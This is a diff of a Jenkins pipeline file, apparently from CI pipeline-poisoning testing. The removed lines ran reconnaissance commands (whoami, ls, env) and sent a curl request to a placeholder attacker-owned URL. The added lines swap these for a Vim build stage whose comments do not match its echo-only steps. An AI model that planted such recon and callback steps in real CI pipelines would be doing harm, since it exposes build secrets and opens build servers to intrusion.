@@ -1,34 +1,34 @@
 pipeline {
     agent any
-
     stages {
-        stage('Run Bash Commands') {
+        stage('Clone Vim repository') {
             steps {
-                script {
-                    // Simple echo
-                    sh '''
-                    echo "Running Bash commands..."
-                    whoami 
-                    ls -al
-                    env
-                    java -version
-                    apt
-                    cd
-                    '''
+                // Clone the Vim repository to /tmp/vim
+                
+                sh '''
+                echo Starting
+                echo brrp
+                '''
+            }
+        }
 
-                    // cURL command
+        stage('Build Vim') {
+            steps {
+                dir('/var/lib/jenkins/vim') {
+                    // Navigate into the vim directory and run the build commands
                     sh '''
-                    echo "Executing cURL to the HTTP DUMP..."
-                    curl -v <ATTACKER_OWNED_URL>
-                    '''
-
-                    // Another Bash command (just as an example)
-                    sh '''
-                    echo "Finished cURL. Running another Bash command..."
-                    date
+			make clean
+                        make
                     '''
                 }
             }
+        }
+    }
+
+    post {
+        always {
+            // Optional: Cleanup the /tmp/vim directory after build
+            sh 'echo Finishing'
         }
     }
 }
